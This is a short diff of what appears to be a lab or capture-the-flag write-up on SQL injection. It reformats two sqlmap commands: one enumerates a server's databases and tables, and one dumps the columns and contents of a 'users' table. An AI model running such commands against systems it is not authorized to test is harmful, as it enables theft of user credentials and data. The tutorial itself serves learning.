@@ -26,7 +26,7 @@ After doing this, we can go ahead to use sqlmap.
 
 Lets start with checking the tables available on the server.
 
->command:sqlmap -r req.txt --dbs --tables
+command:```sqlmap -r req.txt --dbs --tables```
 
 -r →To read the file
 — dbs → To enumerate database
@@ -46,7 +46,7 @@ Okay, from the above screenshots we found out that the name of the database is �
 
 Now, lets go ahead and dump the contents of the columns in the “users” table
 
->command:sqlmap -r req.txt -D search -T users --columns --dump
+command:```sqlmap -r req.txt -D search -T users --columns --dump```
 
 -r → To read the file
 -D → Database Name
